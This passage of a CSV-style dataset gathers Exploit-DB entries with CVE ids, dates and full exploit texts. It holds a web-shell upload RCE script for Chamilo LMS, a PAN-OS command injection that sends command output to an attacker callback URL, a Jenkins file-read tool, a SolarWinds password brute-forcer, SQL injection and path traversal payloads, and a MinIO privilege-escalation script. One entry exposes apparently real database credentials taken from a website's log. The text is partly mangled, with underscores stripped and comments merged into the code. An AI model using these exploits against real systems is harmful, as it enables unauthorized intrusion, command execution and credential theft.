= args.chain.encode('utf-8') base64_value = base64.b64encode(chain).decode('utf-8').replace(""="", """") chain = generate_filter_chain(base64_value) print(""[+] The following gadget chain will generate the following code : {} (base64 value: {})"".format(args.chain, base64_value)) print(chain) if args.rawbase64 is not None: rawbase64 = args.rawbase64.replace(""="", """") match = re.search(""^([A-Za-z0-9+/])$"", rawbase64) if (match): chain = generatefilterchain(rawbase64, True) print(chain) else: print (""[-] Base64 string required."") exit(1) if name == ""main"": main()"
CVE-2023-4220,"{""CVE-2023-4220"": 1}",2025-03-18,Chamilo LMS 1.11.24 - Remote Code Execution (RCE),https://www.exploit-db.com/exploits/52083,"Exploit Title: Chamilo LMS 1.11.24 - Remote Code Execution (RCE) Exploit Author: 0x00-null - Mohamed Kamel BOUZEKRIA Exploit Date: September 3, 2024 Vendor Homepage: <URL> Software Link: <URL> Version: 1.11.24 (Beersel) Tested Versions: 1.11.24 (Beersel) - August 31, 2023 CVE ID: CVE-2023-4220 Vulnerability Type: Remote Code Execution Description: Unauthenticated remote code execution in Chamilo LMS <= 1.11.24 due to an unrestricted file upload vulnerability. Proof of Concept: Yes Categories: Web Application, Remote Code Execution, File Upload CVSS Score: 8.1 (High) CVSS Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H Notes: Ensure that the /main/inc/lib/javascript/bigupload/files/ directory exists and is writable. License: MIT License References: # - CVE Details: <URL> # - Exploit Documentation: <URL> # - Vendor Advisory: <URL> import requests import argparse from urllib.parse import urljoin def uploadshell(targeturl, payloadname): uploadurl = urljoin(targeturl, ""main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported"") shellpath = f""/main/inc/lib/javascript/bigupload/files/{payloadname}"" shellurl = urljoin(targeturl, shellpath) Payload containing the PHP web shell files = {'bigUploadFile': (payloadname, ' ', 'application/x-php')} Upload the payload response = requests.post(uploadurl, files=files) if response.statuscode == 200: print(""[+] File uploaded successfully!"") print(f""[+] Access the shell at: {shellurl}?cmd="") else: print(""[-] File upload failed."") def executecommand(shellurl, cmd): Execute the command response = requests.get(f""{shellurl}?cmd={cmd}"") if response.statuscode == 200: print(f""[+] Command Output:\n{response.text}"") else: print(f""[-] Failed to execute command at {shellurl}"") if name == ""main"": Parse command-line arguments parser = argparse.ArgumentParser(description=""CVE-2023-4220 Chamilo LMS Unauthenticated File Upload RCE Exploit"") parser.addargument('targeturl', help=""The target base URL of the Chamilo LMS instance (e.g., <URL> parser.addargument('cmd', help=""The command to execute on the remote server"") parser.addargument('--shell', default='rce.php', help=""The name of the shell file to be uploaded (default: rce.php)"") args = parser.parseargs() Run the exploit with the provided arguments uploadshell(args.targeturl, args.shell) Form the shell URL to execute commands shellurl = urljoin(args.targeturl, f""main/inc/lib/javascript/bigupload/files/{args.shell}"") executecommand(shellurl, args.cmd)"
CVE-2024-46626,"{""CVE-2024-46626"": 1}",2024-10-01,openSIS 9.1 - SQLi (Authenticated),https://www.exploit-db.com/exploits/52080,"Exploit Title: openSIS 9.1 - SQLi (Authenticated) Google Dork: intext:""openSIS is a product"" Date: 09.09.2024 Exploit Author: Devrim Dıragumandan (d0ub1edd) Vendor Homepage: <URL> Software Link: <URL> Version: 9.1 Tested on: Linux A SQL injection vulnerability exists in OS4Ed Open Source Information System Community v9.1 via the ""X-Forwarded-For"" header parameters in POST request sent to /Ajax.php. GET /Ajax.php?modname=x HTTP/1.1 Parameter: X-Forwarded-For 1* ((custom) HEADER) Type: boolean-based blind Title: MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE) Payload: 127.0.0.2' AND EXTRACTVALUE(5785,CASE WHEN (5785=5785) THEN 5785 ELSE 0x3A END) AND 'HVwG'='HVwG Type: error-based Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTIDSUBSET) Payload: 127.0.0.2' AND GTIDSUBSET(CONCAT(0x717a787671,(SELECT (ELT(5261=5261,1),0x71716b6b71),5261) AND 'djze'='djze Type: time-based blind Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP) Payload: 127.0.0.2' AND (SELECT 5313 FROM (SELECT(SLEEP(5)VeyP) AND 'ZIae'='ZIae FIX: <URL>"
CVE-2024-40422,"{""CVE-2024-40422"": 1}",2024-08-04,Devika v1 - Path Traversal via &#039;snapshot_path&#039;,https://www.exploit-db.com/exploits/52066,"Exploit Title: Devika v1 - Path Traversal via 'snapshotpath' Parameter Google Dork: N/A Date: 2024-06-29 Exploit Author: Alperen Ergel Contact: (IG/X) Vendor Homepage: <URL> Software Link: <URL> Version: v1 Tested on: Windows 11 Home Edition CVE: CVE-2024-40422 #!/usr/bin/python import argparse import requests def exploit(targeturl): url = f' <URL> params = { 'snapshotpath': '../../../../etc/passwd' response = requests.get(url, params=params) print(response.text) if name == ""main"": parser = argparse.ArgumentParser(description='Exploit directory traversal vulnerability.') parser.addargument('-t', '--target', help='Target URL (e.g., target.com)', required=True) args = parser.parseargs() exploit(args.target)"
CVE-2024-28999,"{""CVE-2024-28999"": 1}",2024-06-26,SolarWinds Platform 2024.1 SR1 - Race Condition,https://www.exploit-db.com/exploits/52055,"Exploit Title: SolarWinds Platform 2024.1 SR1 - Race Condition CVE: CVE-2024-28999 Affected Versions: SolarWinds Platform 2024.1 SR 1 and previous versions Author: Elhussain Fathy, AKA 0xSphinx import requests import urllib3 import asyncio import aiohttp urllib3.disablewarnings(urllib3.exceptions.InsecureRequestWarning) http = urllib3.PoolManager(certreqs='CERTREQUIRED') host = '192.168.1.1' username = ""admin"" filepath = ""passwords.txt"" host = input(""Enter the host: "") username = input(""Enter the username: "") filepath = input(""Enter the passwords file path: "") exploited = 0 url = f"" <URL> passwords = [] with open(filepath, 'r') as file: for line in file: word = line.strip() passwords.append(word) print(f""Number of tested passwords: {len(passwords)}"") headers = { 'Host': host, sessions = [] for in range(len(passwords)): response = requests.get(url, headers=headers, verify=False, stream=False) cookies = response.headers.get('Set-Cookie', '') sessionid = cookies.split('ASP.NETSessionId=')[1].split(';')[0] sessions.append(sessionid) async def sendrequest(session, username, password): headers = { 'Host': host, 'Content-Type': 'application/x-www-form-urlencoded', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'Cookie': f'ASP.NETSessionId={session}; TestCookieSupport=Supported; OrionIsSessionExp=TRUE', data = f'EVENTTARGET=ctl00%24BodyContent%24LoginButton&EVENTARGUMENT=&VIEWSTATE=AEQKNijmHeR5jZhMrrXSjzPRqhTz%2BoTqkfNmc3EcMLtc%2FIjqS37FtvDMFn83yUTgHBJIlMRHwO0UVUVzwcg2cO%2B%2Fo2CEYGVzjB1Ume1UkrvCOFyR08HjFGUJOR4q9GX0fmhVTsvXxy7A2hH64m5FBZTL9dfXDZnQ1gUvFp%2BleWgLTRssEtTuAqQQxOLA3nQ6n9Yx%2FL4QDSnEfB3b%2FlSWw8Xruui0YR5kuN%2BjoOH%2BEC%2B4wfZ1%2BCwYOs%2BLmIMjrK9TDFNcWTUg6HHiAn%2By%2B5wWpsj7qiJG3%2F1uhWb8fFc8Mik%3D&VIEWSTATEGENERATOR=01070692&ctl00%24BodyContent%24Username={username}&ctl00%24BodyContent%24Password={password}' async with aiohttp.ClientSession() as session: async with session.post(url, headers=headers, data=data, ssl=False, allowredirects=False) as response: if response.status == 302: global exploited exploited = 1 print(f""Exploited Successfully Username: {username}, Password: {password}"") async def main(): tasks = [] for i in range(len(passwords)): session = sessions[i] password = passwords[i] task = asyncio.createtask(sendrequest(session, username, password)) tasks.append(task) await asyncio.gather(*tasks) asyncio.run(main()) if(not exploited): print(""Exploitation Failed"")"
CVE-2023-27636,"{""CVE-2023-27636"": 1}",2024-06-03,Sitefinity 15.0 - Cross-Site Scripting (XSS),https://www.exploit-db.com/exploits/52035,"Exploit Title: Sitefinity 15.0 - Cross-Site Scripting (XSS) Date: 2023-12-05 Exploit Author: Aldi Saputra Wahyudi Vendor Homepage: <URL> Version: < 15.0.0 Tested on: Windows/Linux CVE : CVE-2023-27636 Description: In the backend of the Sitefinity CMS, a Cross-site scripting vulnerability has been discovered in all features that use SF-Editor Steps To Reproduce: Attacker as lower privilege Victim as Higher privilege 1. Login as an Attacker 2. Go to the function using the SF Editor, go to the news page as example 3. Create or Edit news item 4. On the content form, insert the XSS payload as HTML 5. After the payload is inserted, click on the content form (just click) and publish or save 6. If the victim visits the page with XSS payload, XSS will be triggered Payload:"
CVE-2024-34241,"{""CVE-2024-34241"": 1}",2024-05-19,Rocket LMS 1.9 - Persistent Cross Site Scripting (XSS),https://www.exploit-db.com/exploits/52018,Title: Rocket LMS 1.9 - Persistent Cross Site Scripting (XSS) Date: 04/16/2024 Exploit Author: Sergio Medeiros Vendor Homepage: <URL> Software Link: <URL> Version: 1.9 Tested on Firefox and Chrome Browsers Patched Version: Patch Pending Category: Web Application CVE: CVE-2024-34241 Exploit link: <URL>
CVE-2024-33559,"{""CVE-2024-33559"": 1}",2024-05-19,Wordpress Theme XStore 9.3.8 - SQLi,https://www.exploit-db.com/exploits/52019,Exploit Title: Wordpress Theme XStore 9.3.8 - SQLi Google Dork: N/A Date: 2024-05-16 Exploit Author: [Abdualhadi khalifa ( <URL> Version: 5.3.5 Tested on: Windows10 CVE: CVE-2024-33559
CVE-2024-32113,"{""CVE-2024-32113"": 1}",2024-05-19,Apache OFBiz 18.12.12 - Directory Traversal,https://www.exploit-db.com/exploits/52020,Exploit Title: Apache OFBiz 18.12.12 - Directory Traversal Google Dork: N/A Date: 2024-05-16 Exploit Author: [Abdualhadi khalifa ( <URL> Vendor Homepage: <URL> #Software Link: <URL> Version: below <=18.12.12 Tested on: Windows10
CVE-2022-35914,"{""CVE-2022-35914"": 1}",2024-05-19,htmlLawed 1.2.5 - Remote Code Execution (RCE),https://www.exploit-db.com/exploits/52023,"Exploit Title: htmlLawed 1.2.5 - Remote Code Execution (RCE) Date: 2024-04-24 Exploit Author: Miguel Redondo (aka d4t4s3c) Vendor Homepage: <URL> Software Link: <URL> Version: <= 1.2.5 Tested on: Linux CVE: CVE-2022-35914 banner(){ echo "" _ _ "" echo "" / _\ \ / / | | \ / \_ \| \ | / |/ \/ | || |"" echo ""| | \ \ / /| | ) | | | |) | ) | |_ \ \ () | | || |"" echo ""| | \ V / | ||/ /| || / / / /|) |) \, | | |"" echo "" \| \/ || ||\/_|_| |// //|| ||"" while getopts "":u:c:"" arg; do case $arg in u) URL=$OPTARG; let parametercounter+=1 ;; c) CMD=$OPTARG; let parameter_counter+=1 ;; esac done if [ -z ""$URL"" ] || [ -z ""$CMD"" ]; then banner echo -e ""\n[i] Usage: ${0} -u -c \n"" exit else banner echo -e ""\n[+] Command output:"" fi curl -s -d ""sid=foo&hhook=exec&text=${CMD}"" -b ""sid=foo"" ${URL} | egrep '\ \[[0-9]+\] =\>'| sed -E 's/\ \[[0-9]+\] =\> (.*) /\1/'"
CVE-2023-6710,"{""CVE-2023-6710"": 1}",2024-05-13,Apache mod_proxy_cluster 1.2.6 - Stored XSS,https://www.exploit-db.com/exploits/52010,"import requests import argparse from bs4 import BeautifulSoup from urllib.parse import urlparse, parseqs, urlencode, urlunparse from requests.exceptions import RequestException class Colors: RED = '\033[91m' GREEN = '\033[1;49;92m' RESET = '\033[0m' def getclustermanagerurl(baseurl, path): print(Colors.GREEN + f""Preparing the groundwork for the exploitation on {baseurl}."" + Colors.RESET) try: response = requests.get(baseurl + path) response.raiseforstatus() except requests.exceptions.RequestException as e: print(Colors.RED + f""Error: {e}"" + Colors.RESET) return None print(Colors.GREEN + f""Starting exploit check on {baseurl}."" + Colors.RESET) if response.statuscode == 200: print(Colors.GREEN + f""Check executed successfully on {baseurl}."" + Colors.RESET) Use BeautifulSoup to parse the HTML content soup = BeautifulSoup(response.text, 'html.parser') Find all 'a' tags with 'href' attribute alllinks = soup.findall('a', href=True) Search for the link containing the Alias parameter in the href attribute clustermanagerurl = None for link in alllinks: parsedurl = urlparse(link['href']) queryparams = parseqs(parsedurl.query) aliasvalue = queryparams.get('Alias', [None])[0] if aliasvalue: print(Colors.GREEN + f""Alias value found"" + Colors.RESET) clustermanagerurl = link['href'] break if clustermanagerurl: print(Colors.GREEN + f""Preparing the injection on {baseurl}."" + Colors.RESET) return clustermanagerurl else: print(Colors.RED + f""Error: Alias value not found on {baseurl}."" + Colors.RESET) return None print(Colors.RED + f""Error: Unable to get the initial step on {baseurl}"") return None def updatealiasvalue(url): parsedurl = urlparse(url) queryparams = parseqs(parsedurl.query, keepblankvalues=True) queryparams['Alias'] = ["" ""] updatedurl = urlunparse(parsedurl.replace(query=urlencode(queryparams, doseq=True) print(Colors.GREEN + f""Injection executed successfully on {updatedurl}"" + Colors.RESET) return updatedurl def checkresponseforvalue(url, checkvalue): response = requests.get(url) if check_value in response.text: print(Colors.RED + ""Website is vulnerable"
CVE-2024-3400,"{""CVE-2024-3400"": 1}",2024-04-21,Palo Alto PAN-OS  &lt; v11.1.2-h3  - Command Injection and Arbitrary File Creation,https://www.exploit-db.com/exploits/51996,"Exploit Title: Palo Alto PAN-OS < v11.1.2-h3 - Command Injection and Arbitrary File Creation Date: 21 Apr 2024 Exploit Author: Kr0ff Vendor Homepage: <URL> Software Link: - Version: PAN-OS 11.1 < 11.1.0-h3, < 11.1.1-h1, < 11.1.2-h3 PAN-OS 11.0 < 11.0.0-h3, < 11.0.1-h4, < 11.0.2-h4, < 11.0.3-h10, < 11.0.4-h1 PAN-OS 10.2 < 10.2.0-h3, < 10.2.1-h2, < 10.2.2-h5, < 10.2.3-h13, < 10.2.4-h16, < 10.2.5-h6, < 10.2.6-h3, < 10.2.7-h8, < 10.2.8-h3, < 10.2.9-h1 Tested on: Debian CVE : CVE-2024-3400 #!/usr/bin/env python3 import sys try: import argparse import requests except ImportError: print(""Missing dependencies, either requests or argparse not installed"") sys.exit(2) # <URL> # <URL> def checkvuln(target: str, file: str) -> bool: ret = False uri = ""/ssl-vpn/hipreport.esp"" s = requests.Session() r = """" headers = { ""User-Agent"" : \ ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"", Windows 10 Chrome 118.0.0.0 ""Content-Type"": ""application/x-www-form-urlencoded"", ""Cookie"": \ f""SESSID=../../../var/appweb/sslvpndocs/global-protect/portal/images/{file}"" headersnoCookie = { ""User-Agent"" : \ ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"" Windows 10 Chrome 118.0.0.0 if not "" <URL> or not "" <URL> in target: target = "" <URL> + target try: r = s.post( (target + uri), verify=False, headers=headers, timeout=10 ) except requests.exceptions.Timeout or requests.ConnectionError as e: print(f""Request timed out for \""HTTP\"" !{e}"") print(""Trying with \""HTTPS\""."") target = "" <URL> + target try: r = s.post( (target + uri), verify=False, headers=headers, timeout=10 ) except requests.exceptions.Timeout or requests.ConnectionError as e: print(f""Request timed out for \""HTTPS\"""") sys.exit(1) else: r = s.post( (target + uri), verify=False, headers=headers, timeout=10 ) if r.statuscode == 200: r = s.get( (target + f""/global-protect/portal/images/{file}""), verify=False, headers=headersnoCookie, timeout=10 ) if r.statuscode == 403: print(""Target vulnerable to CVE-2024-3400"") ret = True else: return ret return ret def cmdexec(target: str, callbackurl: str, payload: str) -> bool: ret = False p = """" if "" "" in payload: p = payload.replace("" "", ""${IFS)"") uri = ""/ssl-vpn/hipreport.esp"" headers = { ""User-Agent"" : \ ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"", Windows 10 Chrome 118.0.0.0 ""Content-Type"": ""application/x-www-form-urlencoded"", ""Cookie"": \ f""SESSID=../../../../opt/panlogs/tmp/devicetelemetry/minute/attack782`{callbackurl}?r=$({payload})`"" s = requests.Session() r = """" if not "" <URL> or not "" <URL> in target: target = "" <URL> + target try: r = s.post( (target + uri), verify=False, headers=headers, timeout=10 ) except requests.exceptions.Timeout or requests.ConnectionError as e: print(f""Request timed out for \""HTTP\"" !{e}"") print(""Trying with \""HTTPS\""."") target = "" <URL> + target try: r = s.post( (target + uri), verify=False, headers=headers, timeout=10 ) except requests.exceptions.Timeout or requests.ConnectionError as e: print(f""Request timed out for \""HTTPS\"""") sys.exit(1) else: r = s.post( (target + uri), verify=False, headers=headers, timeout=10 ) if not ""Success"" in r.text: return ret else: ret = True return ret Initilize parser for arguments def argparser(selection=None): parser = argparse.ArgumentParser( description='CVE-2024-3400 - Palo Alto OS Command Injection' ) subparser = parser.addsubparsers( help=""Available modules"", dest=""module"") exploitsubp = subparser.addparser( ""exploit"", help=""Exploit module of script"") exploitsubp.addargument( ""-t"", ""--target"",help=""Target to send payload to"", required=True ) exploitsubp.addargument( ""-p"", ""--payload"", help=""Payload to send (e.g: whoami)"", required=True ) exploitsubp.addargument( ""-c"", ""--callbackurl"", help=""The callback url such as burp collaborator or similar"", required=True ) checksubp = subparser.addparser( ""check"", help=""Vulnerability check module of script"" ) checksubp.addargument( ""-t"", ""--target"", help=""Target to check if vulnerable"", required=True ) checksubp.addargument( ""-f"", ""--filename"", help=""Filename of the payload (e.g \""exploitCheck.exp\"""", required=True ) args = parser.parseargs(selection) args = parser.parseargs(args=None if sys.argv[1:] else [""-h""]) if args.module == ""exploit"": cmdexec(args.target, args.callbackurl, args.payload) if args.module == ""check"": checkvuln(args.target, args.filename) if name == ""main"": argparser() print(""Finished !"")"
CVE-2024-29291,"{""CVE-2024-29291"": 1}",2024-04-21,Laravel Framework 11 - Credential Leakage,https://www.exploit-db.com/exploits/52000,"Exploit Title: Laravel Framework 11 - Credential Leakage Google Dork: N/A Date: [2024-04-19] Exploit Author: Huseein Amer Vendor Homepage: [ <URL> Software Link: N/A Version: 8. - 11. (REQUIRED) Tested on: [N/A] CVE : CVE-2024-29291 Proof of concept: Go to any Laravel-based website and navigate to storage/logs/laravel.log. Open the file and search for ""PDO->construct('mysql:host="". The result: shell Copy code 0 /home/u429384055/domains/js-cvdocs.online/public_html/vendor/laravel/framework/src/Illuminate/Database/Connectors/Connector.php(70): PDO->construct('mysql:host=sql1.', 'u429384055jscv', 'Jaly$$a0p0p0p0', Array) 1 /home/u429384055/domains/js-cvdocs.online/publichtml/vendor/laravel/framework/src/Illuminate/Database/Connectors/Connector.php(46): Illuminate\Database\Connectors\Connector->createPdoConnection('mysql:host=sql1.', 'u429384055jscv', 'Jaly$$a0p0p0p0', Array) Credentials: Username: u429384055jscv Password: Jaly$$a0p0p0p0 Host: sql1."
CVE-2024-31621,"{""CVE-2024-31621"": 1}",2024-04-21,Flowise 1.6.5 - Authentication Bypass,https://www.exploit-db.com/exploits/52001,"Exploit Title: Flowise 1.6.5 - Authentication Bypass Date: 17-April-2024 Exploit Author: Maerifat Majeed Vendor Homepage: <URL> Software Link: <URL> Version: 1.6.5 Tested on: mac-os CVE : CVE-2024-31621 The flowise version <= 1.6.5 is vulnerable to authentication bypass vulnerability. The code snippet this.app.use((req, res, next) => { > if (req.url.includes('/api/v1/')) { > whitelistURLs.some((url) => req.url.includes(url)) ? > next() : basicAuthMiddleware(req, res, next) > } else next() puts authentication middleware for all the endpoints with path /api/v1 except a few whitelisted endpoints. But the code does check for the case sensitivity hence only checks for lowercase /api/v1 . Anyone modifying the endpoints to uppercase like /API/V1 can bypass the authentication."
CVE-2024-22513,"{""CVE-2024-22513"": 1}",2024-04-15,djangorestframework-simplejwt 5.3.1 - Information Disclosure,https://www.exploit-db.com/exploits/51992,"Exploit Title: djangorestframework-simplejwt 5.3.1 - Information Disclosure Date: 26/01/2024 Exploit Author: Dhrumil Mistry (dmdhrumilmistry) Vendor Homepage: <URL> Software Link: <URL> Version: <= 5.3.1 Tested on: MacOS CVE : CVE-2024-22513 The version of djangorestframework-simplejwt up to 5.3.1 is vulnerable. This vulnerability has the potential to cause various security issues, including Business Object Level Authorization (BOLA), Business Function Level Authorization (BFLA), Information Disclosure, etc. The vulnerability arises from the fact that a user can access web application resources even after their account has been disabled, primarily due to the absence of proper user validation checks. If a programmer generates a JWT token for an inactive user using AccessToken class and for_user method then a JWT token is returned which can be used for authentication across the django and django rest framework application. Start Django Shell using below command: python manage.py shell Create inactive user and generate token for the user from django.contrib.auth.models import User from restframeworksimplejwt.tokens import AccessToken create inactive user inactiveuserid = User.objects.createuser('testuser', 'test.com', 'testPassw0rd!', isactive=False).id django application programmer generates token for the inactive user AccessToken.foruser(User.objects.get(id=inactiveuserid)) error should be raised since user is inactive django application verifying user token AccessToken.foruser(User.objects.get(id=inactiveuserid)).verify() no exception is raised during verification of inactive user token"
CVE-2024-23897,"{""CVE-2024-23897"": 1}",2024-04-15,Jenkins 2.441 - Local File Inclusion,https://www.exploit-db.com/exploits/51993,"Exploit Title: Jenkins 2.441 - Local File Inclusion Date: 14/04/2024 Exploit Author: Matisse Beckandt (Backendt) Vendor Homepage: <URL> Software Link: <URL> Version: 2.441 Tested on: Debian 12 (Bookworm) CVE: CVE-2024-23897 from argparse import ArgumentParser from requests import Session, post, exceptions from threading import Thread from uuid import uuid4 from time import sleep from re import findall class Exploit(Thread): def init(self, url: str, identifier: str): Thread.init(self) self.daemon = True self.url = url self.params = {""remoting"": ""false""} self.identifier = identifier self.stopthread = False self.listen = False def run(self): while not self.stopthread: if self.listen: self.listenandprint() def stop(self): self.stopthread = True def receivenextmessage(self): self.listen = True def waitformessage(self): while self.listen: sleep(0.5) def printformattedoutput(self, output: str): if ""ERROR: No such file"" in output: print(""File not found."") elif ""ERROR: Failed to parse"" in output: print(""Could not read file."") expression = ""No such agent \""(.*)\"" exists."" results = findall(expression, output) print(""\n"".join(results)) def listenandprint(self): session = Session() headers = {""Side"": ""download"", ""Session"": self.identifier} try: response = session.post(self.url, params=self.params, headers=headers) except (exceptions.ConnectTimeout, exceptions.ConnectionError): print(""Could not connect to target to setup the listener."") exit(1) self.printformattedoutput(response.text) self.listen = False def sendfilerequest(self, filepath: str): headers = {""Side"": ""upload"", ""Session"": self.identifier} payload = getpayload(filepath) try: post(self.url, data=payload, params=self.params, headers=headers, timeout=4) except (exceptions.ConnectTimeout, exceptions.ConnectionError): print(""Could not connect to the target to send the request."") exit(1) def readfile(self, filepath: str): self.receivenextmessage() sleep(0.1) self.sendfilerequest(filepath) self.waitformessage() def getpayloadmessage(operationindex: int, text: str) -> bytes: textbytes = bytes(text, ""utf-8"") textsize = len(textbytes) textmessage = textsize.tobytes(2) + textbytes messagesize = len(textmessage) payload = messagesize.tobytes(4) + operationindex.tobytes(1) + textmessage return payload def getpayload(filepath: str) -> bytes: argoperation = 0 startoperation = 3 command = getpayloadmessage(argoperation, ""connect-node"") poisonedargument = getpayloadmessage(argoperation, f""@{filepath}"") payload = command + poisonedargument + startoperation.tobytes(1) return payload def startinteractivefileread(exploit: Exploit): print(""Press Ctrl+C to exit"") while True: filepath = input(""File to download:\n> "") filepath = makepathabsolute(filepath) exploit.receivenextmessage() try: exploit.readfile(filepath) except exceptions.ReadTimeout: print(""Payload request timed out."") def makepathabsolute(filepath: str) -> str: if not filepath.startswith('/'): return f""/proc/self/cwd/{filepath}"" return filepath def formattargeturl(url: str) -> str: if url.endswith('/'): url = url[:-1] return f""{url}/cli"" def getarguments(): parser = ArgumentParser(description=""Local File Inclusion exploit for CVE-2024-23897"") parser.addargument(""-u"", ""--url"", required=True, help=""The url of the vulnerable Jenkins service. Ex: <URL> parser.addargument(""-p"", ""--path"", help=""The absolute path of the file to download"") return parser.parseargs() def main(): args = getarguments() url = formattargeturl(args.url) filepath = args.path identifier = str(uuid4()) exploit = Exploit(url, identifier) exploit.start() if filepath: filepath = makepathabsolute(filepath) exploit.readfile(filepath) exploit.stop() return try: startinteractivefileread(exploit) except KeyboardInterrupt: pass print(""\nQuitting"") exploit.stop() if name == ""main"": main()"
CVE-2023-40278,"{""CVE-2023-40278"": 1}",2024-04-15,OpenClinic GA 5.247.01 - Information Disclosure,https://www.exploit-db.com/exploits/51994,"Exploit Title: OpenClinic GA 5.247.01 - Information Disclosure Date: 2023-08-14 Exploit Author: VB Vendor Homepage: <URL> Software Link: <URL> Version: OpenClinic GA 5.247.01 Tested on: Windows 10, Windows 11 CVE: CVE-2023-40278 Details An Information Disclosure vulnerability was discovered in the printAppointmentPdf.jsp component of OpenClinic GA 5.247.01. The issue arises due to improper handling of error messages in response to manipulated input, allowing an attacker to deduce the existence of specific appointments. Proof of Concept ("
CVE-2023-40279,"{""CVE-2023-40279"": 1}",2024-04-15,OpenClinic GA 5.247.01 - Path Traversal (Authenticated),https://www.exploit-db.com/exploits/51995,"Exploit Title: OpenClinic GA 5.247.01 - Path Traversal (Authenticated) Date: 2023-08-14 Exploit Author: V. B. Vendor Homepage: <URL> Software Link: <URL> Version: OpenClinic GA 5.247.01 Tested on: Windows 10, Windows 11 CVE: CVE-2023-40279 Details An issue was discovered in OpenClinic GA version 5.247.01, where an attacker can perform a directory path traversal via the 'Page' parameter in a GET request to 'main.do'. This vulnerability allows for the retrieval and execution of files from arbitrary directories. Proof of Concept ("
CVE-2024-31804,"{""CVE-2024-31804"": 1}",2024-04-12,Terratec dmx_6fire USB - Unquoted Service Path,https://www.exploit-db.com/exploits/51977,"Exploit Title: Terratec dmx6fire USB - Unquoted Service Path Google Dork: null Date: 4/10/2024 Exploit Author: Joseph Kwabena Fiagbor Vendor Homepage: <URL> Software Link: Version: v.1.23.0.02 Tested on: windows 7-11 CVE : CVE-2024-31804 1. Description: The Terratec dmx6fire usb installs as a service with an unquoted service path running with SYSTEM privileges. This could potentially allow an authorized but non-privileged local user to execute arbitrary code with elevated privileges on the system. 2. Proof > C:\Users\Astra>sc qc ""ttdmx6firesvc"" > {SC] QueryServiceConfig SUCCESS > SERVICENAME: ttdmx6firesvc > TYPE : 10 WIN32OWNPROCESS > STARTTYPE : 2 AUTOSTART > ERRORCONTROL : 1 NORMAL > BINARYPATHNAME : C:\Program Files\TerraTec\DMX6FireUSB\ttdmx6firesvc.exe -service > LOADORDERGROUP : PlugPlay > TAG : 0 > DISPLAYNAME : DMX6Fire Control > DEPENDENCIES : eventlog > : PlugPlay > SERVICESTART_NAME : LocalSystem"
CVE-2024-24747,"{""CVE-2024-24747"": 1}",2024-04-12,MinIO &lt; 2024-01-31T20-20-33Z - Privilege Escalation,https://www.exploit-db.com/exploits/51976,"Exploit Title: MinIO < 2024-01-31T20-20-33Z - Privilege Escalation Date: 2024-04-11 Exploit Author: Jenson Zhao Vendor Homepage: <URL> Software Link: <URL> Version: Up to (excluding) RELEASE.2024-01-31T20-20-33Z Tested on: Windows 10 CVE : CVE-2024-24747 Required before execution: pip install minio,requests import argparse import datetime import traceback import urllib from xml.dom.minidom import parseString import requests import json import base64 from minio.credentials import Credentials from minio.signer import signv4s3 class CVE202424747: newbuckets = [] oldbuckets = [] def init(self, host, port, consoleport, accesskey, secretkey, verify=False): self.bucketnames = ['pocpublic', 'pocprivate'] self.newaccesskey = 'miniocvepoc' self.newsecretkey = 'MINIOcvePOC' self.headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36', 'Content-Type': 'application/json', 'Accept': '/' self.accesskey = accesskey self.secretkey = secretkey self.verify = verify if verify: self.url = "" <URL> + host + "":"" + port self.consoleurl = "" <URL> + host + "":"" + consoleport else: self.url = "" <URL> + host + "":"" + port self.consoleurl = "" <URL> + host + "":"" + consoleport self.credits = Credentials( accesskey=self.newaccesskey, secretkey=self.newsecretkey self.login() try: self.createbuckets() self.createaccesskey() self.oldbuckets = self.consolels() self.consoleexp() self.newbuckets = self.consolels() except: traceback.printstack() finally: self.deleteaccesskey() self.deletebuckets() if len(self.newbuckets) > len(self.oldbuckets): print(""There is CVE-2024-24747 problem with the minio!"") print(""Before the exploit, the buckets are : "" + str(self.oldbuckets)) print(""After the exploit, the buckets are : "" + str(self.newbuckets)) else: print(""There is no CVE-2024-24747 problem with the minio!"") def login(self): url = self.url + ""/api/v1/login"" payload = json.dumps({ ""accessKey"": self.accesskey, ""secretKey"": self.secretkey self.session = requests.session() if self.verify: self.session.verify = False statuscode = self.session.request(""POST"", url, headers=self.headers, data=payload).statuscode print(statuscode) if statuscode == 204: statuscode = 0 else: print('Login failed! Please check if the input accesskey and secretkey are correct!') exit(1) def createbuckets(self): url = self.url + ""/api/v1/buckets"" for name in self.bucketnames: payload = json.dumps({ ""name"": name, ""versioning"": False, ""locking"": False statuscode = self.session.request(""POST"", url, headers=self.headers, data=payload).statuscode print(statuscode) if statuscode == 200: statuscode = 0 else: print(""新建 (New)""+name+"" bucket 失败 (fail)！"") def deletebuckets(self): for name in self.bucketnames: url = self.url + ""/api/v1/buckets/"" + name statuscode = self.session.request(""DELETE"", url, headers=self.headers).statuscode print(statuscode) if statuscode == 204: statuscode = 0 else: print(""删除 (delete)""+name+"" bucket 失败 (fail)！"") def createaccesskey(self): url = self.url + ""/api/v1/service-account-credentials"" payload = json.dumps({ ""policy"": ""{ \n \""Version\"":\""2012-10-17\"", \n \""Statement\"":[ \n { \n \""Effect\"":\""Allow\"", \n \""Action\"":[ \n \""s3:\"" \n ], \n \""Resource\"":[ \n \""arn:aws:s3:pocpublic\"", \n \""arn:aws:s3:pocpublic/\"" \n ] \n } \n ] \n}"", ""accessKey"": self.newaccesskey, ""secretKey"": self.newsecretkey statuscode = self.session.request(""POST"", url, headers=self.headers, data=payload).statuscode print(statuscode) if statuscode == 201: print(""新建 (New)"" + self.newaccesskey + "" accessKey 成功 (success)！"") print(self.newsecretkey) statuscode = 0 else: 